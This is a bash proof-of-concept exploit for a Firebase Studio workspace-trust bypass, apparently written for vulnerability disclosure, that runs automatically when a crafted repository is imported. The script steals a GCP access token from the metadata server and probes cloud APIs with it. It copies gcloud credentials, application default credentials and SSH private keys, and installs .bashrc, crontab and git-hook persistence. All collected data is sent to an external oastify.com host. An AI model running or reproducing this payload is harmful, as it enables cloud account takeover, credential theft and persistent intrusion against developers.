#!/bin/bash
# =====================================================================
# PoC: Firebase Studio - Workspace Trust Bypass -> 1-Click RCE
# =====================================================================
# Vector:    .vscode/tasks.json with runOn:"folderOpen"
# Root Cause: enableWorkspaceTrust MISSING from product.json
#             BrowserWorkbenchEnvironmentService.disableWorkspaceTrust
#             returns !undefined = true, disabling entire trust system
# Trigger:   idx.google.com/import?url=https://github.com/ATTACKER/REPO
# User clicks "Import" -> workspace opens -> this script auto-executes
# No trust dialog, no restricted mode, no warning of any kind
# =====================================================================

EXFIL="https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com"
LOOT="/tmp/.fbs-loot-$$"
mkdir -p "$LOOT"

# ── Phase 1: Proof of Auto-Execution ──────────────────────────────────
cat > "$LOOT/01-execution-proof.txt" << EOF
FIREBASE STUDIO WORKSPACE TRUST BYPASS - AUTO-EXECUTION PROOF
==============================================================
Timestamp : $(date -u +%Y-%m-%dT%H:%M:%SZ)
User      : $(whoami) (UID=$(id -u), GID=$(id -g))
Hostname  : $(hostname)
Workspace : $(pwd)
Home      : $HOME
Trigger   : .vscode/tasks.json -> runOn: folderOpen
Trust     : DISABLED (no dialog shown, no user consent)
==============================================================
EOF

# ── Phase 2: GCP Metadata Server ─────────────────────────────────────
# The metadata server provides project info and OAuth2 access tokens
# to any process running in the VM - no authentication required
META="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"

GCP_PROJECT=$(curl -sf -m5 -H "$MH" "$META/project/project-id")
GCP_NUMERIC=$(curl -sf -m5 -H "$MH" "$META/project/numeric-project-id")
GCP_SA=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/email")
GCP_SCOPES=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/scopes")
GCP_ZONE=$(curl -sf -m5 -H "$MH" "$META/instance/zone")
GCP_INSTANCE=$(curl -sf -m5 -H "$MH" "$META/instance/name")
GCP_ATTRS=$(curl -sf -m5 -H "$MH" "$META/instance/attributes/" 2>/dev/null)

cat > "$LOOT/02-gcp-metadata.txt" << EOF
GCP METADATA SERVER - FULL ACCESS
==================================
Project ID      : $GCP_PROJECT
Numeric ID      : $GCP_NUMERIC
Service Account : $GCP_SA
Zone            : $GCP_ZONE
Instance        : $GCP_INSTANCE
Scopes          : $GCP_SCOPES
Attributes      : $GCP_ATTRS
EOF

# ── Phase 3: Steal GCP Access Token ──────────────────────────────────
# This OAuth2 token grants access to ALL GCP APIs within the SA's scope
TOKEN_JSON=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/token")
ACCESS_TOKEN=$(echo "$TOKEN_JSON" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('access_token', ''))
except:
    print('')
" 2>/dev/null)
TOKEN_TYPE=$(echo "$TOKEN_JSON" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('token_type', ''))
except:
    print('')
" 2>/dev/null)
TOKEN_EXPIRY=$(echo "$TOKEN_JSON" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(data.get('expires_in', ''))
except:
    print('')
" 2>/dev/null)

cat > "$LOOT/03-access-token.txt" << EOF
GCP ACCESS TOKEN - STOLEN VIA METADATA SERVER
===============================================
Token Type  : $TOKEN_TYPE
Expires In  : ${TOKEN_EXPIRY}s
Token Length : ${#ACCESS_TOKEN} characters
Token First50: ${ACCESS_TOKEN:0:50}...

This token grants immediate access to Google Cloud APIs.
An attacker can use it to access the victim's:
- Cloud Storage buckets
- Firestore/Firebase databases
- Cloud Functions
- Other GCP services within scope
EOF

# ── Phase 4: Exploit GCP APIs with Stolen Token ─────────────────────
AUTH="Authorization: Bearer $ACCESS_TOKEN"

# 4a: List all GCP projects the victim has access to
PROJECTS=$(curl -sf -m15 -H "$AUTH" \
  "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=10" 2>/dev/null)

# 4b: List Cloud Storage buckets (data exfiltration)
BUCKETS=$(curl -sf -m15 -H "$AUTH" \
  "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT" 2>/dev/null)

# 4c: Check Firebase project details
FIREBASE=$(curl -sf -m15 -H "$AUTH" \
  "https://firebase.googleapis.com/v1beta1/projects/$GCP_PROJECT" 2>/dev/null)

# 4d: List other workstations (lateral movement)
WORKSTATIONS=$(curl -sf -m15 -H "$AUTH" \
  "https://workstations.googleapis.com/v1/projects/$GCP_PROJECT/locations/-/workstationClusters/-/workstations" 2>/dev/null)

# 4e: List Compute Engine instances
INSTANCES=$(curl -sf -m15 -H "$AUTH" \
  "https://compute.googleapis.com/compute/v1/projects/$GCP_PROJECT/aggregated/instances" 2>/dev/null | head -c 2000)

cat > "$LOOT/04-gcp-api-exploitation.txt" << EOF
GCP API EXPLOITATION WITH STOLEN TOKEN
========================================
Using the access token stolen from the metadata server to
demonstrate cloud-level impact beyond the workspace VM.

[4a] GCP Projects (victim's projects):
${PROJECTS:0:2000}

[4b] Cloud Storage Buckets:
${BUCKETS:0:2000}

[4c] Firebase Project:
${FIREBASE:0:2000}

[4d] Other Workstations (lateral movement):
${WORKSTATIONS:0:2000}

[4e] Compute Engine Instances:
${INSTANCES:0:2000}
EOF

# ── Phase 5: Local Credential Harvesting ─────────────────────────────
# credentials.db contains OAuth2 REFRESH TOKENS that provide
# PERSISTENT access to the victim's Google account - even after
# the workspace is deleted, the attacker retains access
{
echo "LOCAL CREDENTIAL HARVESTING"
echo "==========================="
echo ""

CRED_DB="$HOME/.config/gcloud/credentials.db"
if [ -f "$CRED_DB" ]; then
  CRED_SIZE=$(wc -c < "$CRED_DB")
  echo "[+] credentials.db: FOUND ($CRED_SIZE bytes)"
  echo "    Location: $CRED_DB"
  echo "    Tables: $(sqlite3 "$CRED_DB" '.tables' 2>/dev/null)"
  echo "    Rows: $(sqlite3 "$CRED_DB" 'SELECT COUNT(*) FROM credentials' 2>/dev/null)"
  echo "    CRITICAL: Contains OAuth2 refresh tokens"
  echo "    These tokens provide PERSISTENT access to the"
  echo "    victim's Google Cloud even after workspace deletion"
  cp "$CRED_DB" "$LOOT/credentials.db" 2>/dev/null
  echo "    -> Copied for exfiltration"
else
  echo "[-] credentials.db: not found"
fi
echo ""

ADC="$HOME/.config/gcloud/application_default_credentials.json"
if [ -f "$ADC" ]; then
  echo "[+] Application Default Credentials: FOUND"
  echo "    Location: $ADC"
  echo "    Size: $(wc -c < "$ADC") bytes"
  cp "$ADC" "$LOOT/adc.json" 2>/dev/null
  echo "    -> Copied for exfiltration"
else
  echo "[-] ADC: not found"
fi
echo ""

GCLOUD_PROPS="$HOME/.config/gcloud/properties"
if [ -f "$GCLOUD_PROPS" ]; then
  echo "[+] gcloud properties: FOUND"
  cat "$GCLOUD_PROPS" 2>/dev/null
fi
echo ""

echo "[*] SSH Keys:"
if [ -d "$HOME/.ssh" ]; then
  ls -la "$HOME/.ssh/" 2>/dev/null
  for key in "$HOME/.ssh/id_"*; do
    [ -f "$key" ] && cp "$key" "$LOOT/" 2>/dev/null && echo "    -> Copied: $(basename $key)"
  done
else
  echo "    No .ssh directory"
fi
echo ""

echo "[*] Git Config:"
git config --global --list 2>/dev/null | head -10
echo ""

echo "[*] Environment Secrets:"
env | grep -iE "(TOKEN|KEY|SECRET|PASS|CRED|AUTH|API_)" 2>/dev/null | \
  sed 's/=.\{20\}/=REDACTED_BUT_ACCESSIBLE/' | head -15

} > "$LOOT/05-local-credentials.txt" 2>&1

# ── Phase 6: User Data & Source Code Access ──────────────────────────
{
echo "USER DATA & SOURCE CODE ACCESS"
echo "==============================="
echo ""
echo "[*] Home directory:"
ls -la "$HOME/" 2>/dev/null | head -30
echo ""
echo "[*] Other workspaces/projects:"
find "$HOME" -maxdepth 3 -name ".git" -type d 2>/dev/null | head -20
echo ""
echo "[*] Interesting files:"
find "$HOME" -maxdepth 3 \( -name "*.env" -o -name ".env.*" -o -name "*.pem" \
  -o -name "*.key" -o -name "*.p12" -o -name "service-account*.json" \
  -o -name "*secret*" -o -name "*credential*" \) 2>/dev/null | head -20
} > "$LOOT/06-user-data.txt" 2>&1

# ── Phase 7: Persistence ─────────────────────────────────────────────
{
echo "PERSISTENCE MECHANISMS"
echo "======================"
echo ""

# 7a: .bashrc persistence (survives workspace restart)
if ! grep -q "fbs-poc-persist" "$HOME/.bashrc" 2>/dev/null; then
  cat >> "$HOME/.bashrc" << 'BASHRC'

# fbs-poc-persist
(curl -sf "https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com/persist" \
  -d "h=$(hostname)&u=$(whoami)&t=$(date +%s)" &>/dev/null &)
BASHRC
  echo "[+] .bashrc persistence: INSTALLED"
  echo "    Executes on every new shell session"
else
  echo "[*] .bashrc persistence: already active"
fi

# 7b: crontab persistence
(crontab -l 2>/dev/null; echo "*/30 * * * * curl -sf 'https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com/cron' -d h=\$(hostname) &>/dev/null # fbs-poc") | \
  sort -u | crontab - 2>/dev/null
echo "[+] Crontab persistence: INSTALLED (every 30 min)"

# 7c: git hooks (executes on every git operation in any repo)
GIT_HOOKS="$HOME/.config/git/hooks"
mkdir -p "$GIT_HOOKS" 2>/dev/null
if [ ! -f "$GIT_HOOKS/pre-commit" ]; then
  cat > "$GIT_HOOKS/pre-commit" << 'GITHOOK'
#!/bin/bash
# fbs-poc git hook persistence
curl -sf "https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com/git-hook" \
  -d "repo=$(basename $(git rev-parse --show-toplevel))&u=$(whoami)" &>/dev/null &
GITHOOK
  chmod +x "$GIT_HOOKS/pre-commit"
  git config --global core.hooksPath "$GIT_HOOKS" 2>/dev/null
  echo "[+] Git hook persistence: INSTALLED (triggers on every commit)"
fi

echo ""
echo "All persistence mechanisms survive workspace stop/start/archive cycles"
echo "because Firebase Studio uses persistent disks (not ephemeral like Cloud Shell)"

} > "$LOOT/07-persistence.txt" 2>&1

# ── Phase 8: Exfiltration ────────────────────────────────────────────
# Send all collected data to attacker's server
for f in "$LOOT"/0*.txt; do
  curl -sf -m10 "$EXFIL/fbs-poc/$(basename "$f")" \
    --data-binary "@$f" &>/dev/null
done

# Exfiltrate stolen credentials (the high-value target)
[ -f "$LOOT/credentials.db" ] && \
  curl -sf -m30 "$EXFIL/fbs-poc/credentials.db" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@$LOOT/credentials.db" &>/dev/null

[ -f "$LOOT/adc.json" ] && \
  curl -sf -m10 "$EXFIL/fbs-poc/adc.json" \
    --data-binary "@$LOOT/adc.json" &>/dev/null

# Final status
echo "POC_COMPLETE $(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$LOOT/status.txt"
